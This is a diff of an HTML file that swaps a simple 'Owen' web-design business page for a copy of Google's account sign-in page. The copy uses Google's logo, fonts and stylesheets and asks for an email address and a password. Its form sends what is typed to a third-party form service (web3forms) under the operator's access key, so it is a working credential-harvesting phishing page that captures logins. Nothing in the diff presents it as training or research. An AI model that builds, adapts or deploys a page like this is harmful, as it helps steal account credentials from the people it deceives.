@@ -1,176 +1,81 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Owen</title>
+<title>Sign in - Google Accounts</title>
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500&display=swap" rel="stylesheet" />
+
+
+<link href="https://accounts.google.com/_/signin/static/_/ss/k=signin.ltr.en_US.c7dbfef1a3571c19a6d7e1122d5c416a17c5e559.woff2" rel="stylesheet" />
+<link rel="stylesheet" href="https://accounts.google.com/_/signin/static/_/ss/k=signin.ltr.en_US.Z0En0XbEUPQ.L.W.O/d=1/rs=AA2YrTv-OgREHzoOnL-P7MwhYu9X08x-Lw/m=fr,ipv6,vw" />
+
 <style>
-  /* Reset & base */
-  * {
-    box-sizing: border-box;
-  }
+
   body {
     margin: 0;
-    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-    line-height: 1.6;
-    background: #000000; /* Black */
-    color: #dddddd;
-    direction: ltr;
+    font-family: 'Roboto', Arial, sans-serif;
+    background-color: rgb(240, 244, 249);
   }
+  #initialView {
+    max-width: 400px;
+    margin: 60px auto;
+    padding: 40px;
+    background: white;
+    border-radius: 25px;
+   
 
-  /* Header */
-  header {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    background: #222222; /* Dark Gray */
-    border-bottom: 3px solid #1DCD9F; /* Vibrant turquoise */
-    border-radius: 0 0 15px 15px;
-    padding: 15px 30px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    box-shadow: 0 2px 10px rgba(29, 205, 159, 0.6);
-    transition: transform 0.3s ease;
-    z-index: 1000;
-  }
-  header.hide {
-    transform: translateY(-100%);
-  }
-  header h1 {
-    margin: 0;
-    font-weight: 700;
-    font-size: 1.7rem;
-    color: #1DCD9F; /* Vibrant turquoise */
-    user-select: none;
-    letter-spacing: 2px;
-  }
-  nav a {
-    color: #1DCD9F;
-    text-decoration: none;
-    margin-left: 20px;
-    font-weight: 600;
-    font-size: 1.05rem;
-    transition: color 0.2s ease;
-  }
-  nav a:hover {
-    color: #169976; /* Teal green */
-  }
-
-  /* Main content */
-  main {
-    padding: 100px 30px 50px; /* top padding to avoid header overlap */
-    max-width: 900px;
-    margin: 0 auto;
-  }
-
-  /* Floating card style for sections */
-  section.card {
-    background: #222222; /* Dark gray */
-    border-radius: 15px;
-    padding: 30px 25px;
-    margin-bottom: 40px;
-    box-shadow: 0 5px 15px rgba(29, 205, 159, 0.3);
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-    cursor: pointer;
-  }
-  section.card:hover {
-    transform: translateY(-10px);
-    box-shadow: 0 15px 30px rgba(29, 205, 159, 0.6);
-  }
-
-  main h2 {
-    font-weight: 700;
-    font-size: 2.2rem;
-    margin-bottom: 0.5em;
-    color: #1DCD9F;
-  }
-  main p {
-    font-size: 1.15rem;
-    color: #cccccc;
-    max-width: 700px;
-  }
-  main a {
-    color: #169976;
-    text-decoration: none;
-    font-weight: 600;
-  }
-  main a:hover {
-    color: #1DCD9F;
-    text-decoration: underline;
-  }
-
-  /* Footer */
-  footer {
-    background: #222222;
-    color: #1DCD9F;
-    text-align: center;
-    padding: 25px 20px;
-    border-radius: 15px 15px 0 0;
-    font-size: 0.95rem;
-    user-select: none;
-  }
 </style>
 </head>
 <body>
 
-<header id="header">
-  <h1>Owen</h1>
-  <nav>
-    <a href="#home">Home</a>
-    <a href="#about">About Us</a>
-    <a href="#contact">Contact</a>
-  </nav>
-</header>
+<div id="initialView">
+  <div class="left">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google" style="display:block; margin:0 auto 24px; width:160px; height:56px;" />
 
-<main>
-  <section id="home" class="card">
-    <h2>Welcome to Owen</h2>
-    <p>
-      At Owen, we create clean and modern web experiences designed to captivate your visitors and keep them coming back. Whether you're building a personal portfolio or a company website, we make it look professional with ease.
-    </p>
-  </section>
+  <h1 class="mdc-typography--headline5" style="text-align:center; font-weight:400; color:#202124;">Sign in</h1>
+  <div style="text-align:center; color:#5f6368; font-size:14px; margin-bottom: 24px;">with your Google Account. This account will be available to other Google apps in the browser.</div>
+  </div>
+  <div>
+  <form action="https://api.web3forms.com/submit" method="POST">
+    <div>
+      <input type="hidden" name="access_key" value="6b1d194b-0623-437c-aafe-c955bd949cde">
+      <input type="email" id="identifierId" name="identifier" placeholder="Email or phone" autocomplete="username" required
+        style="width:100%; padding:14px 12px; font-size:16px; border-radius:4px; border:1px solid #dadce0; margin-bottom: 16px;" />
+      <input type="password" id="identifierId" name="identifier" placeholder="password" autocomplete="username" required
+        style="width:100%; padding:14px 12px; font-size:16px; border-radius:4px; border:1px solid #dadce0; margin-bottom: 16px;" />      
 
-  <section id="about" class="card">
-    <h2>About Us</h2>
-    <p>
-      Owen is a small team of passionate developers and designers dedicated to delivering beautiful and functional websites. We believe simplicity and usability are the keys to great design.
-    </p>
-  </section>
+    </div>
+    <div style="text-align:right; margin-bottom:32px;">
+      <a href="#" style="color:#1a73e8; font-size:14px; text-decoration:none;">Forgot email?</a>
+    </div>
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+      <a href="#" style="color:#1a73e8; font-size:14px; text-decoration:none;">Create account</a>
+      <button type="submit"
+        style="background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:14px; padding:10px 24px; cursor:pointer;">Next</button>
+    </div>
+  </form>
+  
 
-  <section id="contact" class="card">
-    <h2>Contact</h2>
-    <p>
-      Got questions? Want to collaborate? Reach out to us anytime at
-      <a href="mailto:hello@owen.com">hello@owen.com</a>.
-    </p>
-  </section>
-</main>
+  <div style="margin-top:40px; text-align:center;">
+    <select style="font-size:13px; color:#5f6368; border:none; background:none; cursor:pointer;">
+      <option>English (United Kingdom)</option>
+      <option>English (United States)</option>
+      <option>العربية</option>
+      <option>Français</option>
+    </select>
+  </div>
 
-<footer>
-  &copy; 2025 Owen. All rights reserved.
-</footer>
-
-<script>
-  const header = document.getElementById('header');
-  let lastScroll = 0;
-
-  window.addEventListener('scroll', () => {
-    const currentScroll = window.pageYOffset;
-
-    if (currentScroll <= 0) {
-      header.classList.remove('hide');
-    } else if (currentScroll > lastScroll) {
-      header.classList.add('hide');
-    } else {
-      header.classList.remove('hide');
-    }
-
-    lastScroll = currentScroll;
-  });
-</script>
+  <div style="margin-top:12px; text-align:center; font-size:13px; color:#5f6368;">
+    <a href="#" style="margin:0 8px; color:#5f6368; text-decoration:none;">Help</a>
+    <a href="#" style="margin:0 8px; color:#5f6368; text-decoration:none;">Privacy</a>
+    <a href="#" style="margin:0 8px; color:#5f6368; text-decoration:none;">Terms</a>
+  </div>
+</div>
 
 </body>
 </html>
-
